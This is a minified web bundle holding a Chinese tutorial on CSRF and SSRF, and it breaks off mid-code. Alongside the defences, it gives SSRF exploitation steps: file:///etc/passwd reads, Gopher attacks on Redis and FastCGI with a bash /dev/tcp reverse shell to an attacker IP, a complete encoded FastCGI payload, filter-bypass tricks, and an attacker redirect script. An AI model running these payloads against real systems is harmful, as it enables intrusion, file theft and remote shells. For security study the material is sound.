(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[24],{154:function(e,a,t){"use strict";t.r(a),t.d(a,"default",(function(){return r}));t(130),t(0);var n=t(93);function s(){return(s=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function p(e,a){if(null==e)return{};var t,n,s=function(e,a){if(null==e)return{};var t,n,s={},p=Object.keys(e);for(n=0;n<p.length;n++)t=p[n],a.indexOf(t)>=0||(s[t]=e[t]);return s}(e,a);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(n=0;n<p.length;n++)t=p[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(s[t]=e[t])}return s}var c={},b="wrapper";function r(e){var a=e.components,t=p(e,["components"]);return Object(n.b)(b,s({},c,t,{components:a,mdxType:"MDXLayout"}),Object(n.b)("h1",{className:"__internal",id:"请求伪造漏洞"},"请求伪造漏洞",Object(n.b)("a",s({parentName:"h1"},{href:"#%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h1",{className:"__internal",id:"csrf"},"CSRF",Object(n.b)("a",s({parentName:"h1"},{href:"#csrf","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h2",{className:"__internal",id:"csrf原理"},"CSRF原理",Object(n.b)("a",s({parentName:"h2"},{href:"#csrf%E5%8E%9F%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"CSRF是跨站请求伪造攻击，由客户端发起，是由于没有在执行关键操作时，进行",Object(n.b)("inlineCode",{parentName:"p"},"是否由用户自愿发起的"),"确认"),Object(n.b)("p",{parentName:"blockquote"},"攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。 ")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"比如某网站",Object(n.b)("strong",{parentName:"p"},"用户信息修改"),"功能，没有验证Referer也没添加Token，"),Object(n.b)("p",{parentName:"blockquote"},"攻击者可以用HTML构造恶意代码提交POST请求，诱骗已经登陆的受害者点击，可以直接修改用户信息  ")),Object(n.b)("h2",{className:"__internal",id:"防御"},"防御",Object(n.b)("a",s({parentName:"h2"},{href:"#%E9%98%B2%E5%BE%A1","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("ul",{parentName:"blockquote"},Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"验证Referer"),Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"添加token"))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"token和referer做横向对比，谁安全等级高？")),Object(n.b)("p",null,"token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。\ntoken的话，要遵守不可预测性原则，保证其随机性（ 通过当前时间戳生成随机数 ）"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"对referer的验证，从什么角度去做？如果做，怎么杜绝问题")),Object(n.b)("p",null,"对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。\n为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"),"\t"),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等;"),Object(n.b)("p",{parentName:"blockquote"},"二是结合信息泄露漏洞对它的获取，结合着发起组合攻击;"),Object(n.b)("p",{parentName:"blockquote"},"信息泄露有可能是缓存、日志、get，也有可能是利用跨站;"),Object(n.b)("p",{parentName:"blockquote"},"很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了;")),Object(n.b)("h1",{className:"__internal",id:"ssrf"},"SSRF",Object(n.b)("a",s({parentName:"h1"},{href:"#ssrf","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"SSRF(Server-Side Request Forgery:服务器端请求伪造)  是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。"),Object(n.b)("p",{parentName:"blockquote"},"攻击的目标是从外网无法访问的内部系统\t( 正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统 )"),Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"SSRF 成因"),"是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制 (没有做合法性验证)。")),Object(n.b)("h2",{className:"__internal",id:"出现场景"},"出现场景",Object(n.b)("a",s({parentName:"h2"},{href:"#%E5%87%BA%E7%8E%B0%E5%9C%BA%E6%99%AF","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"能够对外发起网络请求的地方，就可能存在 SSRF 漏洞。"),Object(n.b)("p",null,"在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。"),Object(n.b)("p",null,"从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。"),Object(n.b)("h2",{className:"__internal",id:"检测"},"检测",Object(n.b)("a",s({parentName:"h2"},{href:"#%E6%A3%80%E6%B5%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"SSRF漏洞的验证方法："),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"1）通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞"),Object(n.b)("p",{parentName:"blockquote"},"2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 ")),Object(n.b)("h2",{className:"__internal",id:"常见防御和绕过"},"常见防御和绕过",Object(n.b)("a",s({parentName:"h2"},{href:"#%E5%B8%B8%E8%A7%81%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"检查Host是否是内网IP")," ；IP地址转换绕过，DNS解析绕过(xip.io)，利用URL解析器滥用 "),Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"限制可用协议和请求端口"),"(HTTP、HTTPS；80、443)；302跳转绕过"),Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"禁止跳转"),"；"),Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"URL长度限制"),"；短链接：",Object(n.b)("a",s({parentName:"p"},{href:"https://tinyurl.com/",target:"_blank"}),"生成短链接的网站"))),Object(n.b)("h2",{className:"__internal",id:"攻击利用方法"},"攻击利用方法",Object(n.b)("a",s({parentName:"h2"},{href:"#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h4",{className:"__internal",id:"内网端口扫描"},Object(n.b)("strong",{parentName:"h4"},"内网端口扫描"),Object(n.b)("a",s({parentName:"h4"},{href:"#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-bash"}),"ssrf.php?url",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"127.0"),".0.1:3306\t\t",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#探测是否存在MySQL服务")))),Object(n.b)("h4",{className:"__internal",id:"file协议读取内网文件"},Object(n.b)("strong",{parentName:"h4"},"file协议读取内网文件"),Object(n.b)("a",s({parentName:"h4"},{href:"#file%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-bash"}),"ssrf.php?url",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"file:///etc/passwd"))),Object(n.b)("h4",{className:"__internal",id:"gopher打redis"},Object(n.b)("strong",{parentName:"h4"},"GOPHER打redis"),Object(n.b)("a",s({parentName:"h4"},{href:"#gopher%E6%89%93redis","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"条件："),"能未授权或者通过弱口令认证访问到Redis服务器")),Object(n.b)("p",null,"方式主要有："),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"1、绝对路径写webshell"),Object(n.b)("p",{parentName:"blockquote"},"2、写contrab计划任务反弹shell")),Object(n.b)("p",null,"用脚本直接生成payload后去打就行（",Object(n.b)("a",s({parentName:"p"},{href:"https://github.com/LS95/gopher-redis-auth",target:"_blank"}),"脚本在这"),"，RESP协议还是要了解的，不能光会用脚本）"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"curl")," -v ",Object(n.b)("span",s({parentName:"code"},{className:"token string"}),'"payload内容"')))),Object(n.b)("h4",{className:"__internal",id:"gopher打fastcgi"},Object(n.b)("strong",{parentName:"h4"},"GOPHER打FastCGI"),Object(n.b)("a",s({parentName:"h4"},{href:"#gopher%E6%89%93fastcgi","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。 "),Object(n.b)("p",null,"首先根据",Object(n.b)("a",s({parentName:"p"},{href:"https://github.com/piaca/fcgi_exp",target:"_blank"}),"faci_exp"),"生成exp，随后改成支持gopher协议的URL "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-bash"}),"./fcgi_exp system 目标IP ",Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"9000")," /var/www/html/1.php ",Object(n.b)("span",s({parentName:"code"},{className:"token string"}),'"bash -i >& /dev/tcp/攻击者IP/2333 0>&1"'),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"nc")," -lvv ",Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"2333")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),">")," ",Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"1"),".txt\nxdd ",Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"1"),".txt"))),Object(n.b)("p",null," 构造 Gopher 协议的 URL： "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"cmd"},Object(n.b)("pre",s({parentName:"div"},{className:"language-cmd"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-cmd"}),"gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00"))),Object(n.b)("p",null,"curl请求"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"curl")," -v ",Object(n.b)("span",s({parentName:"code"},{className:"token string"}),'"Gopher协议的URL"')))),Object(n.b)("p",null,"本地监听2333端口，收到反弹shell "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"nc")," -lvv ",Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"2333")))),Object(n.b)("p",null,Object(n.b)("a",s({parentName:"p"},{href:"https://www.zhihu.com/question/30672017",target:"_blank"}),"如何通俗地解释 CGI、FastCGI、php-fpm 之间的关系？")),Object(n.b)("h2",{className:"__internal",id:"常见绕过方法"},"常见绕过方法",Object(n.b)("a",s({parentName:"h2"},{href:"#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h4",{className:"__internal",id:"一、检查ip是否为内网ip"},"一、检查IP是否为内网IP",Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%B8%80%E3%80%81%E6%A3%80%E6%9F%A5ip%E6%98%AF%E5%90%A6%E4%B8%BA%E5%86%85%E7%BD%91ip","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"很多开发者认为，只要检查一下请求url的host不为内网IP，即可防御SSRF。"),Object(n.b)("p",null,"通常使用正则过滤以下5个IP段："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(n.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-text"}),"192.168.0.0/16\n10.0.0.0/8\n172.16.0.0/12\n127.0.0.0/8\n0.0.0.0/8   #在Linux下，127.0.0.1与0.0.0.0都指向本地"))),Object(n.b)("p",null,"这种防御方法通常可以用IP地址进制转换绕过"),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"利用八进制IP地址绕过 0177.0.0.1"),Object(n.b)("p",{parentName:"blockquote"},"利用十六进制IP地址绕过 0x7f000001"),Object(n.b)("p",{parentName:"blockquote"},"利用十进制的IP地址绕过 2130706433")),Object(n.b)("p",null,"他们一个都匹配不上正则表达式， 但实际请求都是127.0.0.1 "),Object(n.b)("h4",{className:"__internal",id:"二、dns解析绕过"},"二、DNS解析绕过",Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%BA%8C%E3%80%81dns%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"Host可能是IP形式，也可能是域名形式。"),Object(n.b)("p",null,"如果Host是域名形式，我们是没法直接比对的，只要其解析到内网IP上，就可以绕过。"),Object(n.b)("p",null,"网上有个神奇域名 ",Object(n.b)("a",s({parentName:"p"},{href:"http://xip.io/",target:"_blank"}),"http://xip.io")," (有墙)，",Object(n.b)("a",s({parentName:"p"},{href:"https://www.cnblogs.com/wintrysec/p/www.127.0.0.1.xip.io",target:"_blank"}),"www.127.0.0.1.xip.io"),",会自动解析到127.0.0.1"),Object(n.b)("h4",{className:"__internal",id:"三、利用url解析器滥用"},"三、利用URL解析器滥用",Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8url%E8%A7%A3%E6%9E%90%E5%99%A8%E6%BB%A5%E7%94%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。"),Object(n.b)("p",{parentName:"blockquote"},"这时候可能会出现对URL参数解析不当，导致可以绕过过滤"),Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("a",s({parentName:"p"},{href:"http://www.baidu.com@127.0.0.1/",target:"_blank"}),"http://www.baidu.com@127.0.0.1")),Object(n.b)("p",{parentName:"blockquote"},"当后端程序通过不正确的正则表达式,对上述URL的内容解析的时候"),Object(n.b)("p",{parentName:"blockquote"},"会认为访问URL的host为",Object(n.b)("a",s({parentName:"p"},{href:"https://www.cnblogs.com/wintrysec/p/www.baidu.com",target:"_blank"}),"www.baidu.com"),",而实际上请求的是127.0.0.1上的内容")),Object(n.b)("p",null,Object(n.b)("img",s({parentName:"p"},{src:"/img/image-20200120223636988.png",alt:null}))),Object(n.b)("p",null,"构造CURL的payload："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"curl")," -d ",Object(n.b)("span",s({parentName:"code"},{className:"token string"}),'"url=http://foo@127.0.0.1:80@www.baidu.com/flag.php"')," ",Object(n.b)("span",s({parentName:"code"},{className:"token string"}),'"http://192.168.43.157"')))),Object(n.b)("h4",{className:"__internal",id:"四、301302跳转绕过"},"四、301/302跳转绕过",Object(n.b)("a",s({parentName:"h4"},{href:"#%E5%9B%9B%E3%80%81301302%E8%B7%B3%E8%BD%AC%E7%BB%95%E8%BF%87","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"条件")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"1.程序的合法性检验逻辑为:检查url参数的host是否为内网地址"),Object(n.b)("p",{parentName:"blockquote"},"2.使用的是CURL方法，并且CURLOPT_FOLLOWLOCATION为true(即跟随302/301进行跳转)")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"可利用的协议：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"http/https ok"),Object(n.b)("p",{parentName:"blockquote"},"dict ok"),Object(n.b)("p",{parentName:"blockquote"},"gopher ok"),Object(n.b)("p",{parentName:"blockquote"},"file no! ",Object(n.b)("a",s({parentName:"p"},{href:"https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html",target:"_blank"}),"原因"))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"服务端代码：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(n.b)("pre",s({parentName:"div"},{className:"language-php"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-php"}),"//ssrf.php\n",Object(n.b)("span",s({parentName:"code"},{className:"token php language-php"}),Object(n.b)("span",s({parentName:"span"},{className:"token delimiter important"}),"<?php"),"                                                                                                                                                \n",Object(n.b)("span",s({parentName:"span"},{className:"token keyword"}),"function")," ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$url"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"{"),"                                                         \n    ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch")," ",Object(n.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl_init"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"                                                       \n    ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(n.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_URL"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$url"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"                                     \n    ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(n.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_HEADER"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(n.b)("span",s({parentName:"span"},{className:"token number"}),"0"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"                                     \n    ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(n.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_FOLLOWLOCATION"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(n.b)("span",s({parentName:"span"},{className:"token boolean constant"}),"true"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),Object(n.b)("span",s({parentName:"span"},{className:"token comment"}),'//根据服务器返回 HTTP 头中的 "Location: " 重定向 '),"\n    ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl_exec"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"                                                     \n    ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl_close"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"                                                         \n",Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"}"),"                                                                            \n",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$url")," ",Object(n.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),Object(n.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'url'"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"                                                         \n",Object(n.b)("span",s({parentName:"span"},{className:"token keyword"}),"print")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$url"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"                                                                  \n",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"curl"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$url"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"攻击者的vps：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(n.b)("pre",s({parentName:"div"},{className:"language-php"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-php"}),"//302.php\n",Object(n.b)("span",s({parentName:"code"},{className:"token php language-php"}),Object(n.b)("span",s({parentName:"span"},{className:"token delimiter important"}),"<?php"),"  \n",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$schema")," ",Object(n.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),Object(n.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'schema'"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ip"),"     ",Object(n.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),Object(n.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'ip'"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$port"),"   ",Object(n.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),Object(n.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'port'"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$query"),"  ",Object(n.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),Object(n.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'query'"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(n.b)("span",s({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(n.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"\\n"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",s({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$schema")," ",Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),".")," ",Object(n.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"://"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"."),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ip"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"."),Object(n.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"/"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"."),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$query"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(n.b)("span",s({parentName:"span"},{className:"token keyword"}),"if"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token keyword"}),"empty"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$port"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"{"),"  \n    ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"header"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"Location: ',Object(n.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$schema")),"://",Object(n.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ip")),"/",Object(n.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$query")),'"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"}")," ",Object(n.b)("span",s({parentName:"span"},{className:"token keyword"}),"else")," ",Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(n.b)("span",s({parentName:"span"},{className:"token function"}),"header"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"Location: 